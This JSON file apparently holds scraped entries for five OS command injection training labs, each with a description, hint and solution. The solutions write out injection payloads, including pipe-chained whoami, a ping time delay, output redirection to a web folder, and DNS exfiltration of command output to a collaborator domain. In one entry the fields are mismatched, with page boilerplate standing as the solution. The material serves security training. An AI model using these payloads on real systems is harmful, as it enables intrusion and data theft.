[
    {
        "name": "OS command injection, simple case",
        "link": "/web-security/os-command-injection/lab-simple",
        "difficulty": "APPRENTICE",
        "description": "This lab contains an OS command injection vulnerability in the product stock checker. The application executes a shell command containing user-supplied product and store IDs, and returns the raw output from the command in its response. To solve the lab, execute the whoami command to determine the name of the current user.",
        "hint": "Use Burp Suite to intercept and modify a request that checks the stock level.",
        "solution": "Modify the storeID parameter, giving it the value 1|whoami. Observe that the response contains the name of the current user."
    },
    {
        "name": "Blind OS command injection with time delays",
        "link": "/web-security/os-command-injection/lab-blind-time-delays",
        "difficulty": "PRACTITIONER",
        "description": "Lab: Blind OS command injection with time delays   PRACTITIONER                                        This lab contains a blind OS command injection vulnerability in the feedback function. The application executes a shell command containing the user-supplied details. The output from the command is not returned in the response. To solve the lab, exploit the blind OS command injection vulnerability to cause a 10 second delay.",
        "hint": "Use Burp Suite to intercept and modify the request that submits feedback.",
        "solution": "Modify the email parameter, changing it to:  email=x||ping+-c+10+127.0.0.1||   Observe that the response takes 10 seconds to return."
    },
    {
        "name": "Blind OS command injection with output redirection",
        "link": "/web-security/os-command-injection/lab-blind-output-redirection",
        "difficulty": "PRACTITIONER",
        "description": "Lab: Blind OS command injection with output redirection   PRACTITIONER                                        This lab contains a blind OS command injection vulnerability in the feedback function. The application executes a shell command containing the user-supplied details. The output from the command is not returned in the response. However, you can use output redirection to capture the output from the command. There is a writable folder at: /var/www/images/ The application serves the images for the product catalog from this location. You can redirect the output from the injected command to a file in this folder, and then use the image loading URL to retrieve the contents of the file. To solve the lab, execute the whoami command and retrieve the output.",
        "hint": "Use Burp Suite to intercept and modify the request that submits feedback.   Modify the email parameter, changing it to:  email=||whoami>/var/www/images/output.txt||   Now use Burp Suite to intercept and modify the request that loads an image of a product.   Modify the filename parameter, changing the value to the name of the file you specified for the output of the injected command:  filename=output.txt   Observe that the response contains the output from the injected command.",
        "solution": "Community solutions  Rana Khalil      Michael Sommer        Register for free to track your learning progress           Practise exploiting vulnerabilities on realistic targets.    Record your progression from Apprentice to Expert.    See where you rank in our Hall of Fame.             REGISTER          As we use reCAPTCHA, you need to be able to access Google's servers to use this function.         var recaptchaClientUrl = \"https://www.google.com/recaptcha/api.js?render=\";     Already got an account? Login here"
    },
    {
        "name": "Blind OS command injection with out-of-band interaction",
        "link": "/web-security/os-command-injection/lab-blind-out-of-band",
        "difficulty": "PRACTITIONER",
        "description": "This lab contains a blind OS command injection vulnerability in the feedback function. The application executes a shell command containing the user-supplied details. The command is executed asynchronously and has no effect on the application's response. It is not possible to redirect output into a location that you can access. However, you can trigger out-of-band interactions with an external domain. To solve the lab, exploit the blind OS command injection vulnerability to issue a DNS lookup to Burp Collaborator.  Note  To prevent the Academy platform being used to attack third parties, our firewall blocks interactions between the labs and arbitrary external systems. To solve the lab, you must use Burp Collaborator's default public server.",
        "hint": "Use Burp Suite to intercept and modify the request that submits feedback. Modify the email parameter, changing it to: email=x||nslookup+x.BURP-COLLABORATOR-SUBDOMAIN|| Right-click and select \"Insert Collaborator payload\" to insert a Burp Collaborator subdomain where indicated in the modified email parameter.",
        "solution": "The solution described here is sufficient simply to trigger a DNS lookup and so solve the lab. In a real-world situation, you would use Burp Collaborator to verify that your payload had indeed triggered a DNS lookup. See the lab on blind OS command injection with out-of-band data exfiltration for an example of this."
    },
    {
        "name": "Blind OS command injection with out-of-band data exfiltration",
        "link": "/web-security/os-command-injection/lab-blind-out-of-band-data-exfiltration",
        "difficulty": "PRACTITIONER",
        "description": "This lab contains a blind OS command injection vulnerability in the feedback function. The application executes a shell command containing the user-supplied details. The command is executed asynchronously and has no effect on the application's response. It is not possible to redirect output into a location that you can access. However, you can trigger out-of-band interactions with an external domain. To solve the lab, execute the whoami command and exfiltrate the output via a DNS query to Burp Collaborator. You will need to enter the name of the current user to complete the lab.  Note  To prevent the Academy platform being used to attack third parties, our firewall blocks interactions between the labs and arbitrary external systems. To solve the lab, you must use Burp Collaborator's default public server.",
        "hint": "Use Burp Suite Professional to intercept and modify the request that submits feedback.",
        "solution": "Go to the Collaborator tab.  Click \"Copy to clipboard\" to copy a unique Burp Collaborator payload to your clipboard.   Modify the email parameter, changing it to something like the following, but insert your Burp Collaborator subdomain where indicated:  email=||nslookup+`whoami`.BURP-COLLABORATOR-SUBDOMAIN||   Go back to the Collaborator tab, and click \"Poll now\". You should see some DNS interactions that were initiated by the application as the result of your payload. If you don't see any interactions listed, wait a few seconds and try again, since the server-side command is executed asynchronously.  Observe that the output from your command appears in the subdomain of the interaction, and you can view this within the Collaborator tab. The full domain name that was looked up is shown in the Description tab for the interaction.  To complete the lab, enter the name of the current user."
    }
]